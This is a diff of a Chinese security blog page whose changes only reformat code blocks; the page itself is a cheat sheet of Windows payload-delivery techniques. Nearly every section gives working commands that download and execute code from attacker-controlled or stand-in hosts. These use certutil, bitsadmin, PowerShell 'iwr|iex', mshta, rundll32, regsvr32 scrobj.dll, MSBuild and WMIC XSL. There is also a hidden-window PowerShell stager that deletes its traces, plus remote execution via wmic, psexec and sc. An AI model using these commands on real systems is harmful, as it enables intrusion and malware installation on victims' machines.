@@ -255,149 +255,64 @@
 <span id="more"></span>
 <hr>
 <h2 id="0x00-载荷投递"><a href="#0x00-载荷投递" class="headerlink" title="0x00 载荷投递"></a>0x00 载荷投递</h2><p>载荷投递执行关注以下两个方向：</p>
-<pre><code>1. 命令本身可以接受一个HTTP URL/UNC路径(指向一台WebDAV服务器)作为其中一个参数，命令具备解析并下载URL对应payload文件的能力
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. 命令本身可以接受一个HTTP URL/UNC路径(指向一台WebDAV服务器)作为其中一个参数，命令具备解析并下载URL对应payload文件的能力</span><br><span class="line"></span><br><span class="line">2. 命令能够执行一个小型的内联脚本(由脚本负责完成下载任务，以及其他恶意程序)</span><br></pre></td></tr></table></figure>
 
-2. 命令能够执行一个小型的内联脚本(由脚本负责完成下载任务，以及其他恶意程序)
-</code></pre>
-<h2 id="0x01-vbs-下载-payload"><a href="#0x01-vbs-下载-payload" class="headerlink" title="0x01 vbs 下载 payload"></a>0x01 vbs 下载 payload</h2><pre><code>cscript downfile.vbs http://192.168.1.115/robots.txt C:\Inetpub\b.txt
+<h2 id="0x01-vbs-下载-payload"><a href="#0x01-vbs-下载-payload" class="headerlink" title="0x01 vbs 下载 payload"></a>0x01 vbs 下载 payload</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cscript downfile.vbs http://192.168.1.115/robots.txt C:\Inetpub\b.txt</span><br><span class="line"></span><br><span class="line">cscript //E:jscript \\webdavserver\folder\payload.txt</span><br><span class="line"></span><br><span class="line">echo set a=createobject(^&quot;adod^&quot;+^&quot;b.stream^&quot;):set w=createobject(^&quot;micro^&quot;+^&quot;soft.xmlhttp^&quot;):w.open^&quot;get^&quot;,wsh.arguments(0),0:w.send:a.type=1:a.open:a.write w.responsebody:a.savetofile wsh.arguments(1),2 &gt;&gt;downfile.vbs</span><br></pre></td></tr></table></figure>
 
-cscript //E:jscript \\webdavserver\folder\payload.txt
+<h2 id="0x02-certutil下载payload"><a href="#0x02-certutil下载payload" class="headerlink" title="0x02 certutil下载payload"></a>0x02 certutil下载payload</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">certutil.exe -urlcache -split -f http://192.168.1.115/robots.txt</span><br><span class="line"></span><br><span class="line">certutil.exe -urlcache -split -f http://192.168.1.115/robots.txt delete  # 清除缓存</span><br><span class="line"></span><br><span class="line">certutil -encode c:\downfile.vbs downfile.bat</span><br><span class="line"></span><br><span class="line">certutil -decode downfile.bat c:\downfile.vbs</span><br><span class="line"></span><br><span class="line">powershell.exe ‐Win hiddeN ‐Exec ByPasS add‐content ‐path %APPDATA%\\cer.cer (New‐Object Net.WebClient).DownloadString(&#x27;http://192.168.1.5/cer.cer&#x27;); certutil ‐decode %APPDATA%\cer.cer %APPDATA%\stage.ps1 &amp; start /b cmd /c powershell.exe ‐Exec Bypass ‐NoExit ‐File %APPDATA%\stage.ps1 &amp; start /b cmd /c del %APPDATA%\cer.cer  # powershell内存加载 + certuil投递</span><br><span class="line"></span><br><span class="line">certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 &amp; certutil -decode payload.b64 payload.dll &amp; C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil /logfile= /LogToConsole=false /u payload.dll</span><br><span class="line"></span><br><span class="line">certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 &amp; certutil -decode payload.b64 payload.exe &amp; payload.exe</span><br></pre></td></tr></table></figure>
 
-echo set a=createobject(^&quot;adod^&quot;+^&quot;b.stream^&quot;):set w=createobject(^&quot;micro^&quot;+^&quot;soft.xmlhttp^&quot;):w.open^&quot;get^&quot;,wsh.arguments(0),0:w.send:a.type=1:a.open:a.write w.responsebody:a.savetofile wsh.arguments(1),2 &gt;&gt;downfile.vbs
-</code></pre>
-<h2 id="0x02-certutil下载payload"><a href="#0x02-certutil下载payload" class="headerlink" title="0x02 certutil下载payload"></a>0x02 certutil下载payload</h2><pre><code>certutil.exe -urlcache -split -f http://192.168.1.115/robots.txt
+<h2 id="0x03-ftp下载payload"><a href="#0x03-ftp下载payload" class="headerlink" title="0x03 ftp下载payload"></a>0x03 ftp下载payload</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">echo open 192.168.1.115 21&gt; ftp.txt</span><br><span class="line">echo 123&gt;&gt; ftp.txt //user</span><br><span class="line">echo 123&gt;&gt; ftp.txt //password</span><br><span class="line">echo binary &gt;&gt; ftp.txt //bin模式</span><br><span class="line">echo get robots.txt &gt;&gt; ftp.txt</span><br><span class="line">echo bye &gt;&gt; ftp.txt</span><br><span class="line"></span><br><span class="line">echo open 127.0.0.1 &gt; o&amp;echo user 123 123 &gt;&gt; o &amp;echo get bin_tcp_x86_53.exe &gt;&gt; o &amp;echo quit &gt;&gt; o &amp;ftp ‐n ‐s:o &amp;del /F /Q o</span><br><span class="line"></span><br><span class="line">echo open 127.0.0.1 &gt; o&amp;echo get bin_tcp_x86_53.exe &gt;&gt; o &amp;echo quit &gt;&gt; o &amp;ftp ‐A ‐n ‐s:o &amp;del /F /Q o</span><br></pre></td></tr></table></figure>
 
-certutil.exe -urlcache -split -f http://192.168.1.115/robots.txt delete  # 清除缓存
+<h2 id="0x04-bitsadmin下载payload"><a href="#0x04-bitsadmin下载payload" class="headerlink" title="0x04 bitsadmin下载payload"></a>0x04 bitsadmin下载payload</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">bitsadmin /rawreturn /transfer down &quot;http://192.168.1.115/robots.txt&quot; E:\PDF\robots.txt</span><br><span class="line"></span><br><span class="line">bitsadmin /transfer down /download /priority normal &quot;http://192.168.1.115/robots.txt&quot; E:\PDF\robots.txt  # 查看进度</span><br><span class="line"></span><br><span class="line">bitsadmin /setpriority down foreground  # 下载过大的文件时提高优先级</span><br><span class="line"></span><br><span class="line">bitsadmin /transfer mydownloadjob /download /priority normal http://&lt;attackerIP&gt;/xyz.exe C:\\Users\\%USERNAME%\\AppData\\local\\temp\\xyz.exe</span><br></pre></td></tr></table></figure>
 
-certutil -encode c:\downfile.vbs downfile.bat
+<h2 id="0x05-js下载payload"><a href="#0x05-js下载payload" class="headerlink" title="0x05 js下载payload"></a>0x05 js下载payload</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">cscript /nologo downfile.js http://192.168.1.115/robots.txt  # 读取</span><br><span class="line"></span><br><span class="line">    var WinHttpReq = new ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);</span><br><span class="line">    WinHttpReq.Open(&quot;GET&quot;, WScript.Arguments(0), /*async=*/false);</span><br><span class="line">    WinHttpReq.Send();</span><br><span class="line">    WScript.Echo(WinHttpReq.ResponseText);</span><br><span class="line"></span><br><span class="line">cscript /nologo dowfile2.js http://192.168.1.115/robots.txt  # 写入</span><br><span class="line"></span><br><span class="line">    var WinHttpReq = new ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);</span><br><span class="line">    WinHttpReq.Open(&quot;GET&quot;, WScript.Arguments(0), /*async=*/false);</span><br><span class="line">    WinHttpReq.Send();</span><br><span class="line"></span><br><span class="line">    BinStream = new ActiveXObject(&quot;ADODB.Stream&quot;); BinStream.Type = 1;</span><br><span class="line"></span><br><span class="line">    BinStream.Open(); BinStream.Write(WinHttpReq.ResponseBody);</span><br><span class="line">    BinStream.SaveToFile(&quot;down.exe&quot;);</span><br></pre></td></tr></table></figure>
 
-certutil -decode downfile.bat c:\downfile.vbs
+<h2 id="0x06-powershell下载执行"><a href="#0x06-powershell下载执行" class="headerlink" title="0x06 powershell下载执行"></a>0x06 powershell下载执行</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$p = New-Object System.Net.WebClient</span><br><span class="line">$p.DownloadFile(&quot;http://domain/file&quot; &quot;C:\%homepath%\file&quot;)</span><br><span class="line"></span><br><span class="line">powershell -exec bypass -c (new-object System.Net.WebClient).DownloadFile(&#x27;http://192.168.1.115/robots.txt&#x27;,&#x27;E:\robots.txt&#x27;)</span><br><span class="line"></span><br><span class="line">powershell -exec bypass -c &quot;(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr(&#x27;http://webserver/payload.ps1&#x27;)|iex&quot;  # 基于HTTP下载执行</span><br><span class="line"></span><br><span class="line">powershell -exec bypass -f \\webdavserver\folder\payload.ps1</span><br></pre></td></tr></table></figure>
 
-powershell.exe ‐Win hiddeN ‐Exec ByPasS add‐content ‐path %APPDATA%\\cer.cer (New‐Object Net.WebClient).DownloadString(&#39;http://192.168.1.5/cer.cer&#39;); certutil ‐decode %APPDATA%\cer.cer %APPDATA%\stage.ps1 &amp; start /b cmd /c powershell.exe ‐Exec Bypass ‐NoExit ‐File %APPDATA%\stage.ps1 &amp; start /b cmd /c del %APPDATA%\cer.cer  # powershell内存加载 + certuil投递
+<h2 id="0x07-cmd下载文件"><a href="#0x07-cmd下载文件" class="headerlink" title="0x07 cmd下载文件"></a>0x07 cmd下载文件</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd.exe /k &lt; \\webdavserver\folder\batchfile.txt</span><br></pre></td></tr></table></figure>
 
-certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 &amp; certutil -decode payload.b64 payload.dll &amp; C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil /logfile= /LogToConsole=false /u payload.dll
+<h2 id="0x08-Mshta下载payload"><a href="#0x08-Mshta下载payload" class="headerlink" title="0x08 Mshta下载payload"></a>0x08 Mshta下载payload</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mshta vbscript:Close(Execute(&quot;GetObject(&quot;&quot;script:http://webserver/payload.sct&quot;&quot;)&quot;))</span><br><span class="line"></span><br><span class="line">mshta http://webserver/payload.hta</span><br><span class="line"></span><br><span class="line">mshta \\webdavserver\folder\payload.hta</span><br></pre></td></tr></table></figure>
 
-certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 &amp; certutil -decode payload.b64 payload.exe &amp; payload.exe
-</code></pre>
-<h2 id="0x03-ftp下载payload"><a href="#0x03-ftp下载payload" class="headerlink" title="0x03 ftp下载payload"></a>0x03 ftp下载payload</h2><pre><code>echo open 192.168.1.115 21&gt; ftp.txt
-echo 123&gt;&gt; ftp.txt //user
-echo 123&gt;&gt; ftp.txt //password
-echo binary &gt;&gt; ftp.txt //bin模式
-echo get robots.txt &gt;&gt; ftp.txt
-echo bye &gt;&gt; ftp.txt
+<h2 id="0x09-Rundll32下载payload"><a href="#0x09-Rundll32下载payload" class="headerlink" title="0x09 Rundll32下载payload"></a>0x09 Rundll32下载payload</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rundll32 \\webdavserver\folder\payload.dll,entrypoint</span><br><span class="line"></span><br><span class="line">rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication&quot;;o=GetObject(&quot;script:http://webserver/payload.sct&quot;);window.close();</span><br></pre></td></tr></table></figure>
 
-echo open 127.0.0.1 &gt; o&amp;echo user 123 123 &gt;&gt; o &amp;echo get bin_tcp_x86_53.exe &gt;&gt; o &amp;echo quit &gt;&gt; o &amp;ftp ‐n ‐s:o &amp;del /F /Q o
-
-echo open 127.0.0.1 &gt; o&amp;echo get bin_tcp_x86_53.exe &gt;&gt; o &amp;echo quit &gt;&gt; o &amp;ftp ‐A ‐n ‐s:o &amp;del /F /Q o
-</code></pre>
-<h2 id="0x04-bitsadmin下载payload"><a href="#0x04-bitsadmin下载payload" class="headerlink" title="0x04 bitsadmin下载payload"></a>0x04 bitsadmin下载payload</h2><pre><code>bitsadmin /rawreturn /transfer down &quot;http://192.168.1.115/robots.txt&quot; E:\PDF\robots.txt
-
-bitsadmin /transfer down /download /priority normal &quot;http://192.168.1.115/robots.txt&quot; E:\PDF\robots.txt  # 查看进度
-
-bitsadmin /setpriority down foreground  # 下载过大的文件时提高优先级
-
-bitsadmin /transfer mydownloadjob /download /priority normal http://&lt;attackerIP&gt;/xyz.exe C:\\Users\\%USERNAME%\\AppData\\local\\temp\\xyz.exe
-</code></pre>
-<h2 id="0x05-js下载payload"><a href="#0x05-js下载payload" class="headerlink" title="0x05 js下载payload"></a>0x05 js下载payload</h2><pre><code>cscript /nologo downfile.js http://192.168.1.115/robots.txt  # 读取
-
-    var WinHttpReq = new ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);
-    WinHttpReq.Open(&quot;GET&quot;, WScript.Arguments(0), /*async=*/false);
-    WinHttpReq.Send();
-    WScript.Echo(WinHttpReq.ResponseText);
-
-cscript /nologo dowfile2.js http://192.168.1.115/robots.txt  # 写入
-
-    var WinHttpReq = new ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);
-    WinHttpReq.Open(&quot;GET&quot;, WScript.Arguments(0), /*async=*/false);
-    WinHttpReq.Send();
-
-    BinStream = new ActiveXObject(&quot;ADODB.Stream&quot;); BinStream.Type = 1;
-
-    BinStream.Open(); BinStream.Write(WinHttpReq.ResponseBody);
-    BinStream.SaveToFile(&quot;down.exe&quot;);
-</code></pre>
-<h2 id="0x06-powershell下载执行"><a href="#0x06-powershell下载执行" class="headerlink" title="0x06 powershell下载执行"></a>0x06 powershell下载执行</h2><pre><code>$p = New-Object System.Net.WebClient
-$p.DownloadFile(&quot;http://domain/file&quot; &quot;C:\%homepath%\file&quot;)
-
-powershell -exec bypass -c (new-object System.Net.WebClient).DownloadFile(&#39;http://192.168.1.115/robots.txt&#39;,&#39;E:\robots.txt&#39;)
-
-powershell -exec bypass -c &quot;(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr(&#39;http://webserver/payload.ps1&#39;)|iex&quot;  # 基于HTTP下载执行
-
-powershell -exec bypass -f \\webdavserver\folder\payload.ps1
-</code></pre>
-<h2 id="0x07-cmd下载文件"><a href="#0x07-cmd下载文件" class="headerlink" title="0x07 cmd下载文件"></a>0x07 cmd下载文件</h2><pre><code>cmd.exe /k &lt; \\webdavserver\folder\batchfile.txt
-</code></pre>
-<h2 id="0x08-Mshta下载payload"><a href="#0x08-Mshta下载payload" class="headerlink" title="0x08 Mshta下载payload"></a>0x08 Mshta下载payload</h2><pre><code>mshta vbscript:Close(Execute(&quot;GetObject(&quot;&quot;script:http://webserver/payload.sct&quot;&quot;)&quot;))
-
-mshta http://webserver/payload.hta
-
-mshta \\webdavserver\folder\payload.hta
-</code></pre>
-<h2 id="0x09-Rundll32下载payload"><a href="#0x09-Rundll32下载payload" class="headerlink" title="0x09 Rundll32下载payload"></a>0x09 Rundll32下载payload</h2><pre><code>rundll32 \\webdavserver\folder\payload.dll,entrypoint
-
-rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication&quot;;o=GetObject(&quot;script:http://webserver/payload.sct&quot;);window.close();
-</code></pre>
 <h2 id="0x0A-Regasm-x2F-Regsvc-subTee"><a href="#0x0A-Regasm-x2F-Regsvc-subTee" class="headerlink" title="0x0A Regasm &#x2F; Regsvc @subTee"></a>0x0A Regasm &#x2F; Regsvc @subTee</h2><p>C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe &#x2F;u \webdavserver\folder\payload.dll</p>
-<h2 id="0x0B-Regsvr32-subTee"><a href="#0x0B-Regsvr32-subTee" class="headerlink" title="0x0B Regsvr32 @subTee"></a>0x0B Regsvr32 @subTee</h2><pre><code>regsvr32 /u /n /s /i:http://webserver/payload.sct scrobj.dll
-regsvr32 /u /n /s /i:\\webdavserver\folder\payload.sct scrobj.dll
-</code></pre>
-<h2 id="0x0C-Odbcconf"><a href="#0x0C-Odbcconf" class="headerlink" title="0x0C Odbcconf"></a>0x0C Odbcconf</h2><pre><code>odbcconf /s /a &#123;regsvr \\webdavserver\folder\payload_dll.txt&#125;
-</code></pre>
-<h2 id="0x0D-Msbuild"><a href="#0x0D-Msbuild" class="headerlink" title="0x0D Msbuild"></a>0x0D Msbuild</h2><pre><code>cmd /V /c &quot;set MB=&quot;C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe&quot; &amp; !MB! /noautoresponse /preprocess \\webdavserver\folder\payload.xml &gt; payload.xml &amp; !MB! payload.xml&quot;
-</code></pre>
+<h2 id="0x0B-Regsvr32-subTee"><a href="#0x0B-Regsvr32-subTee" class="headerlink" title="0x0B Regsvr32 @subTee"></a>0x0B Regsvr32 @subTee</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">regsvr32 /u /n /s /i:http://webserver/payload.sct scrobj.dll</span><br><span class="line">regsvr32 /u /n /s /i:\\webdavserver\folder\payload.sct scrobj.dll</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x0C-Odbcconf"><a href="#0x0C-Odbcconf" class="headerlink" title="0x0C Odbcconf"></a>0x0C Odbcconf</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">odbcconf /s /a &#123;regsvr \\webdavserver\folder\payload_dll.txt&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x0D-Msbuild"><a href="#0x0D-Msbuild" class="headerlink" title="0x0D Msbuild"></a>0x0D Msbuild</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd /V /c &quot;set MB=&quot;C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe&quot; &amp; !MB! /noautoresponse /preprocess \\webdavserver\folder\payload.xml &gt; payload.xml &amp; !MB! payload.xml&quot;</span><br></pre></td></tr></table></figure>
+
 <h2 id="0x0E-Netcat-文件下载"><a href="#0x0E-Netcat-文件下载" class="headerlink" title="0x0E Netcat 文件下载"></a>0x0E Netcat 文件下载</h2><p>攻击机输入：</p>
-<pre><code>cat file.pl | nc -l 1234
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat file.pl | nc -l 1234</span><br></pre></td></tr></table></figure>
+
 <p>目标机命令：</p>
-<pre><code>nc 112.124.118.108 1234 &gt; file
-</code></pre>
-<h2 id="0x0F-NET-IPC-下载"><a href="#0x0F-NET-IPC-下载" class="headerlink" title="0x0F NET + IPC 下载"></a>0x0F NET + IPC 下载</h2><pre><code>net use f: \\IP\c$ &quot;password&quot; /user:&quot;account&quot;    // 将对方的c盘映射为自己的f盘  
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 112.124.118.108 1234 &gt; file</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x0F-NET-IPC-下载"><a href="#0x0F-NET-IPC-下载" class="headerlink" title="0x0F NET + IPC 下载"></a>0x0F NET + IPC 下载</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use f: \\IP\c$ &quot;password&quot; /user:&quot;account&quot;    // 将对方的c盘映射为自己的f盘  </span><br></pre></td></tr></table></figure>
+
 <h2 id="0x10-wmic投递执行"><a href="#0x10-wmic投递执行" class="headerlink" title="0x10 wmic投递执行"></a>0x10 wmic投递执行</h2><p><strong>1) 使用wmic创建进程执行程序</strong></p>
-<pre><code>wmic.exe process call create calc
-# Execute calc.exe.
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wmic.exe process call create calc</span><br><span class="line"># Execute calc.exe.</span><br><span class="line"></span><br><span class="line">wmic.exe process call create &quot;c:\ads\file.txt:program.exe&quot;</span><br><span class="line"># Execute a .EXE file stored as an Alternate Data Stream (ADS).</span><br></pre></td></tr></table></figure>
 
-wmic.exe process call create &quot;c:\ads\file.txt:program.exe&quot;
-# Execute a .EXE file stored as an Alternate Data Stream (ADS).
-</code></pre>
 <p><strong>2) 使用wmi向远程主机执行指令</strong></p>
-<pre><code>wmic /node:192.168.1.158 /user:pt007 /password:admin123  process call create &quot;cmd.exe /c ipconfig&gt;d:\result.txt&quot;
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic /node:192.168.1.158 /user:pt007 /password:admin123  process call create &quot;cmd.exe /c ipconfig&gt;d:\result.txt&quot;</span><br></pre></td></tr></table></figure>
+
 <p><strong>3) 解析并执行XSL内的jscript&#x2F;vbscript代码</strong></p>
-<pre><code>wmic.exe process get brief /format:&quot;https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSBinaries/Payload/Wmic_calc.xsl&quot;
-# Execute a script contained in the target .XSL file hosted on a remote server.
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">wmic.exe process get brief /format:&quot;https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSBinaries/Payload/Wmic_calc.xsl&quot;</span><br><span class="line"># Execute a script contained in the target .XSL file hosted on a remote server.</span><br><span class="line"></span><br><span class="line">wmic.exe os get /format:&quot;MYXSLFILE.xsl&quot;</span><br><span class="line"># Executes JScript or VBScript embedded in the target XSL stylesheet.</span><br><span class="line"></span><br><span class="line">wmic.exe process get brief /format:&quot;\\127.0.0.1\c$\Tools\pocremote.xsl&quot;</span><br><span class="line"># Executes JScript or VBScript embedded in the target remote XSL stylsheet.</span><br></pre></td></tr></table></figure>
 
-wmic.exe os get /format:&quot;MYXSLFILE.xsl&quot;
-# Executes JScript or VBScript embedded in the target XSL stylesheet.
-
-wmic.exe process get brief /format:&quot;\\127.0.0.1\c$\Tools\pocremote.xsl&quot;
-# Executes JScript or VBScript embedded in the target remote XSL stylsheet.
-</code></pre>
 <h2 id="0x11-psexec投递执行"><a href="#0x11-psexec投递执行" class="headerlink" title="0x11 psexec投递执行"></a>0x11 psexec投递执行</h2><p>PsExec 是一个轻型的 telnet 替代工具，无需手动安装客户端软件即可执行其他系统上的进程，并且可以获得与控制台应用程序相当的完全交互性</p>
 <p>参数：</p>
-<pre><code>用法：psexec [\\computer[,computer2[,...] | @file][-u user [-p psswd]][-n s][-l][-s|-e][-x][-i [session]][-c [-f|-v]][-w directory][-d][-][-a n,n,...] cmd [arguments]
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">用法：psexec [\\computer[,computer2[,...] | @file][-u user [-p psswd]][-n s][-l][-s|-e][-x][-i [session]][-c [-f|-v]][-w directory][-d][-][-a n,n,...] cmd [arguments]</span><br></pre></td></tr></table></figure>
+
 <p><strong>1) 直接向远程受害者服务器拷贝文件</strong></p>
-<pre><code>psexec \\marklap -c test.exe
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psexec \\marklap -c test.exe</span><br></pre></td></tr></table></figure>
+
 <p><strong>2) 利用远程服务器上的下载工具进行恶意软件的下载</strong></p>
-<pre><code>psexec \\marklap ipconfig /all
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">psexec \\marklap ipconfig /all</span><br><span class="line"></span><br><span class="line"># 通过 /all 开关在远程系统上执行 IpConfig，并在本地显示输出结果</span><br></pre></td></tr></table></figure>
 
-# 通过 /all 开关在远程系统上执行 IpConfig，并在本地显示输出结果
-</code></pre>
-<h2 id="0x12-sc定时任务执行指令"><a href="#0x12-sc定时任务执行指令" class="headerlink" title="0x12 sc定时任务执行指令"></a>0x12 sc定时任务执行指令</h2><pre><code># 向远程主机执行指令
-sc \\192.168.17.138 create test binpath= &quot;c:\test.exe&quot;
-sc \\192.168.17.138 start test
+<h2 id="0x12-sc定时任务执行指令"><a href="#0x12-sc定时任务执行指令" class="headerlink" title="0x12 sc定时任务执行指令"></a>0x12 sc定时任务执行指令</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 向远程主机执行指令</span><br><span class="line">sc \\192.168.17.138 create test binpath= &quot;c:\test.exe&quot;</span><br><span class="line">sc \\192.168.17.138 start test</span><br><span class="line"></span><br><span class="line"># 本机执行指令</span><br><span class="line">sc create test binpath= &quot;c:\test.exe&quot;</span><br><span class="line">sc start test</span><br></pre></td></tr></table></figure>
 
-# 本机执行指令
-sc create test binpath= &quot;c:\test.exe&quot;
-sc start test
-</code></pre>
-<h2 id="0x13-利用UNC机制从远程下载文件"><a href="#0x13-利用UNC机制从远程下载文件" class="headerlink" title="0x13  利用UNC机制从远程下载文件"></a>0x13  利用UNC机制从远程下载文件</h2><pre><code># 从远程下载文件
-extrac32 /Y /C \\webdavserver\share\test.txt C:\folder\test.txt
+<h2 id="0x13-利用UNC机制从远程下载文件"><a href="#0x13-利用UNC机制从远程下载文件" class="headerlink" title="0x13  利用UNC机制从远程下载文件"></a>0x13  利用UNC机制从远程下载文件</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 从远程下载文件</span><br><span class="line">extrac32 /Y /C \\webdavserver\share\test.txt C:\folder\test.txt</span><br><span class="line"></span><br><span class="line">findstr /V /L W3AllLov3DonaldTrump \\webdavserver\folder\file.exe &gt; c:\ADS\file.exe</span><br></pre></td></tr></table></figure>
 
-findstr /V /L W3AllLov3DonaldTrump \\webdavserver\folder\file.exe &gt; c:\ADS\file.exe
-</code></pre>
 <h2 id="0xFF-Reference"><a href="#0xFF-Reference" class="headerlink" title="0xFF Reference"></a>0xFF Reference</h2><ul>
 <li><a target="_blank" rel="noopener" href="https://www.ired.team/offensive-security/code-execution">https://www.ired.team/offensive-security/code-execution</a></li>
 <li><a target="_blank" rel="noopener" href="https://cheatsheet.haax.fr/windows-systems/exploitation/">https://cheatsheet.haax.fr/windows-systems/exploitation/</a></li>
